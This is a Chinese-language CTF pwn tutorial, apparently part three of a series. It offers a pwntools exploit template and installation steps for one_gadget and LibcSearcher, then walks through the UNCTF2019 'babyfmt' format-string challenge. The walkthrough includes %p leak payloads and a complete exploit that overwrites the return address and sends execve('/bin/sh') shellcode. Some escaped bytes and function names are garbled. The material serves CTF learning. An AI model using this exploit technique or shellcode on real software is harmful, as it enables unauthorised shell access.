# PWN入门系列（三）
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x0 PWN入门系列文章列表
[Mac 环境下 PWN入门系列（一）](https://www.anquanke.com/post/id/187922)
[Mac 环境下 PWN入门系列（二）](https://www.anquanke.com/post/id/189960)
## 0x1 pwntools模版
在学习过程中,因为不是特别熟悉，所以每次都要去翻阅相关脚本，为了提高效率，我就把pwntools常用功能集中在一个脚本模版里面，用的时候直接修改即可。
    #!/usr/bin/python
    # -*- coding:utf-8 -*-    
    from pwn import *
    debug = False
    # 设置调试环境
    context.log_level = 'debug'
    context.arch = "i386"
    # 设置tmux程序
    context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
    # 设置调试程序
    elf = ELF('./')
    # 设置lib
    libc = ELF('libc_32.so.6')
    """
    常见的获取lib.so里面的地址偏移
    libc_write=libc.symbols['write']
    libc_system=libc.symbols['system']
    libc_sh=libc.search('/bin/sh').next()
    """
    # PIE 处理模块
    def debug(addr, sh,PIE=True):
        io = sh
        if PIE:
            # proc_base = p.libs()[p.cwd + p.argv[0].strip('.')]
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
            gdb.attach(io,'b *{}'.format(hex(text_base+addr)))
        else:
            gdb.attach(io,"b *{}".format(hex(addr)))
    if debug:
        # 建立本地连接
        sh = process(',/')
    else:
        # 建立远程连接
        link = ''
        ip, port = map(strip,link.split(':'))
        sh = remote(ip, port)
    # attch 程序
    gdb.attch(sh, "b functionn c")
    # shellcode生成
    shellcode = asm(shellcraft.sh())
    # payload = ''
    # 指定接收内容再发送payloada
    sh.sendlineafter('str', payload)
    # 直接发送内容
    sh.sendline(payload)
    # 接收内容
    sh.recvuntil("Input:n")
    sh.sendline(payload)
    address = u32(sh.recv(4))
    # 进入交互模式
    sh.interactive()
## 0x2 Pwn常用工具安装
###  0x2.1 one_gadget
    gem install one_gadget
###  0x2.2 LibcSearcher
    git clone https://github.com/lieanu/LibcSearcher.git
    cd LibcSearcher
    python setup.py develop
Usage:
    from LibcSearcher import *
    #第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型
    obj = LibcSearcher("fgets", 0X7ff39014bd90)
    obj.dump("system")        #system 偏移
    obj.dump("str_bin_sh")    #/bin/sh 偏移
    obj.dump("__libc_start_main_ret")
###  0x2.3 相关参考链接
[pwntools生成的exp模版做了一些修改](https://www.cnblogs.com/junmoxiao/p/7545869.html)
## 0x3 UNCTF2019非堆PWN刷题篇
###  0x3.1 babyfmt
32位程序,上ida
左边`m`,找到`main`函数,`F5`反编译
这里我们可以输入`0x50`个字符,栈的大小是`58h`,而我们需要至少能写入`0x64h`才能控制`ret`
所以这里没办法溢出,但是这里很明显存在格式化字符串漏洞
这里我们可以采用gdb来调试确定地址:
我们在ida里面找到printf漏洞函数栈开始地址是:`080486F3`
    1.gdb ./babyfmt
    2. b *0x080486CD
    3. r
    4. c
    输入"%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.,%1$p.%2$p.%3$p.%22$p"
    这里最多只能输入0x50个字符
    然后继续执行到`printf`格式化字符串漏洞处
我们记录下对应泄漏的地址:
    %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.,%1$p.%2$p.%3$p.%22$p
    0xff8d0810.0x50.0xf759d860.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x31252c2e.0x252e7024.,0xff8d0810.0x50.0xf759d860.0x3232252e
为了方便查看我这里我们可以写个python进行处理下
    #!/usr/bin/python
    # -*- coding:utf-8 -*-    
    s1 = r"%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.,%1$p.%2$p.%3$p.%22$p"
    s2 = r"0xff8d0810.0x50.0xf759d860.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x31252c2e.0x252e7024.,0xff8d0810.0x50.0xf759d860.0x3232252e"
    # s1.split(',')
    # print(s1.split('.'))
    k1 = list(s1.split('.'))
    k2 = list(s2.split('.'))
    # print(k1,k2)
    res = zip(k1,k2)
    for i in res:
        print(i)
然后我们跟进看下对应的是哪里的地址
`x/s 0xffaecfe0`
我们可以看到这里通过`read`函数把我们的输入写入`buf`空间了
我们继续下去
       0x80486f3    add    esp, 0x10
     ► 0x80486f6    sub    esp, 0xc
       0x80486f9    lea    eax, [ebp - 0x58]
       0x80486fc    push   eax
       0x80486fd    call   printf@plt
    我们分析下call printf 之前的操作
    1. esp + 0x10 指向了参数地址 0xffaecfe0
    2. sub    esp, 0xc srstack
    3.lea    eax, [ebp - 0x58]
    4. push   eax
    这些操作其实就是让esp 指向eax eax存放的是我们传入的参数内容
这个时候我们`stack 20`打印下当前栈内容
不难发现泄漏的地址分别是
    esp+4 ->%1$p
    esp+8 ->%2$p
    ........
    这样的规律
这就是格式化字符串%p泄漏指针地址.
    leave:
        mov %ebp %esp
        pop %ebp
    ret:
        将esp的值pop,然后赋值给eip
简化下上面的内容就是:
此时栈结构分布就是:
因为PIE是关闭的, 这样子我们就可以通过格式化字符串改写ret指向我们写在栈上的shellcode地址
不过这里字符串修改ret因为是长度去修改值所以要考虑分段等性能问题。
下面我说说exp是如何手动编写的(格式化字符串其实可以用工具完成，但是不利于我们学习)
    #!/usr/bin/python2.7  
    # -*- coding: utf-8 -*-    from pwn import *
    debug = 1
    context.log_level = "debug"
    context.arch = "i386"
    context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
    elf = ELF("babyfmt")
    sh = 0
    lib = 0
    def pwn(ip,port,debug):
        global sh
        global lib
        if(debug == 1):
            sh = process("./babyfmt")
        else:
            sh = remote(ip,port)
        sh.recvuntil("Please input your message:")
        payload = "%22$p"
        pause()
        gdb.attach(sh, 'b *0x080486CD')
        sh.send(payload)
        ebp = int(sh.recv(10),16)
        log.success("ebp: " + str(ebp))
        ret = ebp - (0xffb66408 - 0xffb663ec)
        buf_addr = ebp - (0xffb66408 - 0xffb66390)
        payload = p32(ret) + p32(ret + 2) + "%" + str(buf_addr % 0x10000 + 0x28 - 8) + "d%4$hn"
        print("payload++:" + payload)
        print(len(payload))
        print(len(p32(ret) + p32(ret + 2)))
        payload += "%" + str((buf_addr >> 16) - (buf_addr % 0x10000) - 0x28 - 2 + 1) + "d%5$hn"
        payload = payload.ljust(0x28,'x00')
        log.success("payload:" + payload)
        payload += "x31xc0x31xd2x31xdbx31xc9x31xc0x31xd2x52x68x2fx2fx73x68x68x2fx62x69x6ex89xe3x52x53x89xe1x31xc0xb0x0bxcdx80"
        log.success("ret: " + hex(ret))
        log.success("ebp: " + hex(ebp))
        log.success("buf_addr: " + hex(buf_addr))
        sh.sendline(payload)
        sh.interactive()
    if __name__ == "__main__":
        pwn("127.0.0.1",10000,1)
这里我直接套用出题人的脚本,然后讲下相关思路:
(1)`payload = "%22$p"`
这个值我们可以通过手动gdb调试来得到:
`1+(0xd8-0x80)/4 = 22` 就是这样来算出ebp的相对位置的
(2)offset的计算
        ret = ebp - (0xffb66408 - 0xffb663ec)
        buf_addr = ebp - (0xffb66408 - 0xffb66390)
这段代码这样写好理解:
        offset1 = 0xffb66408 - 0xffb663e #28
        offset2 = 0xffb66408 - 0xffb66390 #120
        ret = ebp - offset1
        buf_addr = ebp - offset2
那么我们怎么求offset1、2呢,我们同样通过手动debug
`0xffbacc78- 0xffbacc5c = 28`
这个对应关系是由于ebp是前一个栈顶赋值的，而栈的大小是固定的所以不会变。
这里我们回顾下压栈过程步骤:(为了方便这里我假设这里0x是十进制来算的,0x本身代表16进制的)
> ->0x1:call A
>
> rsp rbp 0x41
>
> call A的操作会将0x2压栈,然后跳到函数里面执行
>
> 寄存器| 内存 | 值
>
> rsp 0x40 0x2(下一条指令地址)
>
> rbp 0x41
>
> 0x2: mov eax,0
>
> 函数A里面:
>
> 0x100: push rbp
>
> 寄存器| 内存 | 值
>
> rsp 0x39 0x41
>
> ​ 0x40 0x2(下一条指令地址)
>
> rbp 0x41
>
> 0x101:mov rbp, rsp
>
> 寄存器| 内存 | 值
>
> rbp rsp 0x39 0x41 —-这里就是新的栈底了
>
> ​ 0x40 0x2(下一条指令地址) —这里就是返回地址